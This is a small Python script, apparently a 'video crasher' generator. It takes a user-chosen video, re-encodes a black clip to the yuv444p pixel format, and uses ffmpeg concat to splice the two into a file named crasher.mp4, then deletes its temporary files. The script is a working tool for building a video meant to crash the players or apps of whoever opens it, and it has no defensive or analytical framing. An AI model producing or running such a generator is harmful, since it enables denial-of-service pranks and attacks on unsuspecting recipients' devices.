import os,sys
import subprocess
import glob
from colorama import Fore, Back, Style
def clear():
    os.system("clear")

def main():
    print(" ")
    print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
    firstf = input(f"""    {Fore.BLUE }${Fore.RESET} Video => """)
    print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
    os.system(f"""ffmpeg -i black.mp4 -pix_fmt yuv444p new-vid.mp4""")
    print(" ")
    print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
    open("code.txt", "w").close()
    file = open("code.txt","w") 
    file.write(f"""file {firstf}\n""")
    file.write(f"""file new-vid.mp4""")
    file.close()
    print(" ")
    print(f"""    {Fore.BLUE }[+++]{Fore.RESET}==================={Fore.BLUE }[+++]{Fore.RESET}\n""")
    os.system("ffmpeg -f concat -i code.txt -codec copy crasher.mp4")
    os.system("rm -rf code.txt")
    os.system("rm -rf new-vid.mp4")
    os.system("clear")
    clear()
main()
